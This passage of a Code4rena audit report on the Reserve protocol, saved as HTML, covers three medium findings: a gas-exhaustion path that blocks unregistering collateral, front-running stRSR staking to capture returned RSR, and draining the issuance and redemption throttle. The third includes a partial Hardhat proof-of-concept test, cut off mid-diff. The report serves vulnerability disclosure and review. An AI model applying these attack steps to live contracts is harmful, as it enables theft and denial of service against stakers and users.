id=\"original-issue-2\" style=\"position:relative;\"><a href=\"#original-issue-2\" aria-label=\"original issue 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>M-16: <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254\">RToken permanently insolvent/unusable if a single collateral in the basket behaves unexpectedly</a></p>\n<h3 id=\"lines-of-code-3\" style=\"position:relative;\"><a href=\"#lines-of-code-3\" aria-label=\"lines of code 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/AssetRegistry.sol#L91-L104\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/AssetRegistry.sol#L91-L104</a></p>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The AssetRegistry contains an <code>unregister</code> function which can be used to detach a bad collateral from the RToken system.</p>\n<p>Previously <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254\">M-16</a> was reported as an issue for the RToken system in which a single bad collateral can stop the working of RToken protocol.</p>\n<p>To fix M-16, the <code>basketHandler.quantity</code> call was wrapped in a <code>try/catch</code> block so that the statement can handle any unexpected revert from the collateral contract.</p>\n<p>While the fix handles unexpected reverts, it misses the case which the <code>basketHandler.quantity</code> call may consume the entire transaction gas.</p>\n<p>So, if for some reasons the Collateral contract start consuming more gas than the allowed block gas limit, the <code>basketHandler.quantity</code> call will always fail, resulting in the revert of <code>unregister</code> call.</p>\n<p>This essentially prevent governance from unregistering a collateral from the RToken. The unregistering of a collateral is still dependent upon the code execution of the collateral token contract.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider this scenario:</p>\n<ul>\n<li>TokenA was registered as an asset in AssetRegistry.</li>\n<li>Due to an upgrade/bug/hack the TokenA starts consuming all available gas on function calls.</li>\n<li>The RToken governance decides to unregister the TokenA asset and calls the <code>AssetRegistry.unregister</code> function.</li>\n<li>Internal call chain invokes any function of TokenA contract. The txn reverts with an out of gas error.</li>\n<li>The governance is now unable to unregister TokenA from RToken protocol and RToken is now unusable.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider detaching the interaction with collateral contract completely from the unregistering contract flow. Unregistering a contract must never depend upon the code execution of Collateral token contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1435246259\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Under the <a href=\"https://eips.ethereum.org/EIPS/eip-150\">1/64 rule</a>, even if the call runs out of gas we still remain with 1/64 of the gas available before the call.<br>\nEven if the remaining of <code>unregister()</code> takes about 50K gas units we’d still be fine if we call it with 3.2M gas.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1435314343\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is a good find!</p>\n<p>Seems like another option for mitigation is to make the call to <code>BasketHandler.quantity()</code> reserving some quantity (100k?) of gas for later execution. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1435483929\">AkshaySrivastav (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Ya reserving some gas could be a mitigation.</p>\n<blockquote>\n<p>Under the <a href=\"https://eips.ethereum.org/EIPS/eip-150\">1/64 rule</a>, even if the call runs out of gas we still remain with 1/64 of the gas available before the call.</p>\n</blockquote>\n<p>I think this can be bypassed, after the call to broken Token contract, a default returndatacopy is done which can be used to consume the remaining 1/64 gas. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1438884674\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/647\">reserve-protocol/protocol#647</a></p>\n<p>@AkshaySrivastav - does the linked PR address the issue? Any problems you see with it? </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1439457512\">AkshaySrivastav (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@tbrent some issues I still see which could be concerning are:</p>\n<ol>\n<li>As all external contract calls after completion perform a RETURNDATACOPY, this can be misused to drain the 900k gas that you are reserving. The malicious token contract can return a huge data chunk which can consume the 900k gas.<br></li>\n<li>The mitigation also opens up another issue. The <code>unregister()</code> call can be triggered with ~901k gas (excluding gas cost of require statements for simplicity). This will essentially cause failing of <code>basketHandler.quantity</code> call even for non-malicious collateral tokens. This is a more likely scenario as most governance proposals are open to be executed by anyone (once voting is passed and proposal is queued).</li>\n</ol>\n<p>The actual mitigation of this issue would be to completely detach the code execution of token contract from the unregistering execution flow. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1440323917\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>This seems ok. Not disabling the basket is a UX improvement. If the attack still results in the asset being unregistered then I would say it is not an issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73#issuecomment-1446363327\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After reviewing the documentation for the mitigation contest, I believe this to be a case of mitigation not confirmed and not a mitigation error. </p>\n<p>If you read the original M-16 report it states:</p>\n<blockquote>\n<p>For plugins to function as intended there has to be a dependency on protocol specific function.<br>\nIn a case that the collateral token is corrupted, the governance should be able to replace to corrupted token. The unregistering flow should never be depended on the token functionality.</p>\n</blockquote>\n<p>The key part of this <code>The unregistering flow should never be depended on the token functionality.</code> </p>\n<p>The gas characteristics of the token are part of its functionality, so the mitigation was not sufficient to handle all cases and it’s not a mitigation error / new issue. </p>\n</blockquote>\n<hr>\n<h2 id=\"strsr-attacker-can-steal-excess-rsr-that-is-returned-after-seizure\" style=\"position:relative;\"><a href=\"#strsr-attacker-can-steal-excess-rsr-that-is-returned-after-seizure\" aria-label=\"strsr attacker can steal excess rsr that is returned after seizure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/17\">StRSR: attacker can steal excess rsr that is returned after seizure</a></h2>\n<p><em>Submitted by HollaDieWaldfee, also found by <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/48\">AkshaySrivastav</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<h3 id=\"lines-of-code-4\" style=\"position:relative;\"><a href=\"#lines-of-code-4\" aria-label=\"lines of code 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L176-L182\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L176-L182</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/StRSR.sol#L496-L530\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/StRSR.sol#L496-L530</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p><strong>Note:</strong><br>\nThis issue deals with excess <code>rsr</code> that was seized from <code>stRSR</code> but is returned again.<br>\nThe <code>M-12</code> issue also deals with excess <code>rsr</code>.  </p>\n<p>However <code>M-12</code> deals with the fact that not all <code>rsr</code> is returned to <code>stRSR</code>, whereas this issue deals with the fact that an attacker can steal <code>rsr</code> once it is returned to <code>stRSR</code>.  </p>\n<p>So while the issues seem to be similar they in fact are different.  </p>\n<p>They are separate issues. So I chose to report this separately with the <code>NEW</code> keyword.  </p>\n<h3 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><code>rsr</code> can be returned to <code>stRSR</code> after a seizure if not all seized <code>rsr</code> has been necessary to regain full collateralization.  </p>\n<p>This happens in the <a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L176-L182\"><code>BackingManger.handoutExcessAssets</code></a> function.  </p>\n<p>This excess <code>rsr</code> is then paid out to ALL stakers just like regular <code>rsr</code> rewards using the <a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/StRSR.sol#L496-L530\"><code>StRSR._payoutRewards</code></a> function.  </p>\n<p>This is unfair. An attacker can abuse this behavior and stake <code>rsr</code> to profit from the returned <code>rsr</code> which is used to appreciate his <code>stRSR</code>.  </p>\n<p>It would be fair if the <code>rsr</code> was returned only to the users that had staked when the seizure occurred.  </p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Think of the following scenario:  </p>\n<ol>\n<li>There are currently 100 stakers with an equal share of the <code>1000 rsr</code> total that is currently in the <code>stRSR</code> contract.  </li>\n<li>A seizure occurs and <code>500 rsr</code> are seized.</li>\n<li>Not all <code>rsr</code> is sold and some (say <code>50 rsr</code>) is returned to <code>StRSR</code></li>\n<li>The attacker can front-run the transaction that returns the <code>rsr</code> and become a staker himself</li>\n<li>The attacker will profit from the returned <code>rsr</code> once it is paid out as reward. Say the attacker stakes <code>100 rsr</code>. He now owns a share of <code>100 rsr / (500 rsr + 100 rsr) = 20%</code>. This means he will also get <code>20%</code> of the <code>50 rsr</code> that are paid out as rewards.  </li>\n</ol>\n<h3 id=\"tools-used-15\" style=\"position:relative;\"><a href=\"#tools-used-15\" aria-label=\"tools used 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Ideally, as I said above, the <code>rsr</code> should be returned only to the users that had staked when the seizure occurred.  </p>\n<p>With the current architecture of the <code>stRSR</code> contract this is not possible. There is no way to differentiate between stakers.  </p>\n<p>Also the scenario described is an edge and relies on a seizure to occur and <code>rsr</code> to be returned.  </p>\n<p>It seems unrealistic that <code>10%</code> of the seized <code>rsr</code> is returned again. I think a number like <code>1% - 5%</code> is more realistic.  </p>\n<p>But still if the amount of <code>rsr</code> that is seized is big enough, <code>1% - 5%</code> can be a significant amount in terms of dollar value.  </p>\n<p>I estimate this to be <code>Medium</code> severity since an attacker can profit at the expense of other stakers and this behavior will decrease the willingness of users to stake as the risk of losing funds is increased.  </p>\n<p>This severly damages the incentives involved with staking. Stakers are incentivized to wait for seizures to occur and only then stake as they might profit from returned <code>rsr</code>.  </p>\n<p>I encourage the sponsor to further assess if there is a better way to return excess <code>rsr</code>.  </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/17#issuecomment-1435353214\">tbrent (Reserve) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/17#issuecomment-1440337932\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe that this issue does amount to a “leak of value” and is a valid Medium finding per C4 documentation. It may be accepted by the sponsors as a design tradeoff, but still should be highlighted to end users. </p>\n</blockquote>\n<hr>\n<h2 id=\"attacker-can-temporary-deplete-available-redemptionissuance-by-running-issuance-then-redemption-or-vice-versa\" style=\"position:relative;\"><a href=\"#attacker-can-temporary-deplete-available-redemptionissuance-by-running-issuance-then-redemption-or-vice-versa\" aria-label=\"attacker can temporary deplete available redemptionissuance by running issuance then redemption or vice versa permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79\">Attacker can temporary deplete available redemption/issuance by running issuance then redemption or vice versa</a></h2>\n<p><em>Submitted by 0xA5DF</em></p>\n<p><strong>Severity: Medium</strong></p>\n<h3 id=\"lines-of-code-5\" style=\"position:relative;\"><a href=\"#lines-of-code-5\" aria-label=\"lines of code 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/libraries/Throttle.sol#L66-L75\">https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/libraries/Throttle.sol#L66-L75</a></p>\n<h3 id=\"impact-10\" style=\"position:relative;\"><a href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Attacker can deplete available issuance or redemption by first issuing and then redeeming in the same tx or vice versa.<br>\nThe available redemption/issuance will eventually grow back, but this temporary reduces the available amount.<br>\nThis can also use to front run other user who tries to redeem/issue in order to fail their tx. </p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the PoC below a user is able to reduce the redemption available by more than 99% (1e20 to 1e14), and that’s without spending anything but gas (they end up with the same amount of RToken as before)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/RToken.test.ts b/test/RToken.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e04f51db..33044b79 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/RToken.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/RToken.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1293,6 +1293,31 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        it(&#39;PoC&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          advanceTime(60*60*5);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          let totalSupply =  await rToken.totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          let redemptionAvailable = await rToken.redemptionAvailable();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          let issuanceAvailable = await rToken.issuanceAvailable();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          console.log({redemptionAvailable, issuanceAvailable, totalSupply});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          let toIssue = redemptionAvailable.mul(111111n).div(100000n);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          await rToken.connect(addr1).issue(toIssue);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          await rToken.connect(addr1).redeem(toIssue, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          redemptionAvailable = await rToken.redemptionAvailable();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          issuanceAvailable = await rToken.issuanceAvailable();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          